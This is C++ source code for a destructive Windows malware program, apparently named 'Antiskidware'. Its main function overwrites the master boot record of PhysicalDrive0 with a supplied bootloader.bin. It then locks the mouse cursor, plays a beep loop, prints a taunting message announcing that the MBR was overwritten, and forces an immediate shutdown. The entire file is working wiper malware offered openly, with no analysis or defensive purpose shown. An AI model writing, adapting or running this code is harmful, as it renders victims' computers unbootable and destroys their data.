#include <thread>
#include <vector>
#include <iostream>
#include <Windows.h>
#include <winuser.h>

void overwrite_mbr(void)
{
    HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    HANDLE binary = CreateFileW(L"./bootloader.bin", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
    DWORD  size = GetFileSize(binary, 0); // Must be 512b

    byte* new_mbr = new byte[size];
    DWORD bytes_read;

    ReadFile(binary, new_mbr, size, &bytes_read, 0);
    WriteFile(drive, new_mbr, size, &bytes_read, 0);

    CloseHandle(binary);
    CloseHandle(drive);
}

void beep_music_thread(void)
{
    // Maybe..
    while (true) {
        Beep(440, 500);
        Beep(440, 500);
        Beep(440, 500);
        Beep(349, 350);
        Beep(523, 150);

        Beep(440, 500);
        Beep(349, 350);
        Beep(523, 150);
        Beep(440, 1000);

        Beep(659, 500);
        Beep(659, 500);
        Beep(659, 500);
        Beep(698, 350);
        Beep(523, 150);

        Beep(415, 500);
        Beep(349, 350);
        Beep(523, 150);
        Beep(440, 1000);

        Beep(880, 500);
        Beep(440, 350);
        Beep(440, 150);
        Beep(880, 500);
        Beep(830, 250);
        Beep(784, 250);

        Beep(740, 125);
        Beep(698, 125);
        Beep(740, 250);

        Beep(455, 250);
        Beep(622, 500);
        Beep(587, 250);
        Beep(554, 250);

        Beep(523, 125);
        Beep(466, 125);
        Beep(523, 250);

        Beep(349, 125);
        Beep(415, 500);
        Beep(349, 375);
        Beep(440, 125);

        Beep(523, 500);
        Beep(440, 375);
        Beep(523, 125);
        Beep(659, 1000);

        Beep(880, 500);
        Beep(440, 350);
        Beep(440, 150);
        Beep(880, 500);
        Beep(830, 250);
        Beep(784, 250);

        Beep(740, 125);
        Beep(698, 125);
        Beep(740, 250);

        Beep(455, 250);
        Beep(622, 500);
        Beep(587, 250);
        Beep(554, 250);

        Beep(523, 125);
        Beep(466, 125);
        Beep(523, 250);

        Beep(349, 250);
        Beep(415, 500);
        Beep(349, 375);
        Beep(523, 125);

        Beep(440, 500);
        Beep(349, 375);
        Beep(261, 125);
        Beep(440, 1000);
        Sleep(1000);
    }
}

void console_anim_thread(void) {
    char message[] = "You have been get pwnd by the Antiskidware,\nStop be a skid and learn how to program.\n\nYour masterboot record partition (MBR) was overwritten ! You can say 'Goodbye' to your pc..\n\nhttps://github.com/Its-Vichy/Antiskidware";
    system("title How no pwnd :(, Have a fun to reinstalling an os");

    for (char& letter : message) {
        printf("\u001b[4m%c\u001b[24m", letter);
        Sleep(100);
    }

    system("C:\\Windows\\System32\\shutdown /s /t 0");
}

void mouse_lock_thread(void) {
	while (true) {
		SetCursorPos(0, 0);
	}
}

int main(void)
{
    // Overwrite before get fun (skid can close program before... (ho no ! the kid can't cuz the mouse was locked LMFAO))
    overwrite_mbr();

    std::thread music_thread(beep_music_thread);
    std::thread console_thread(console_anim_thread);
	std::thread mouse_lock_thread(mouse_lock_thread);

    music_thread.join();
    console_thread.join();
	mouse_lock_thread.join();

    return EXIT_SUCCESS;
}
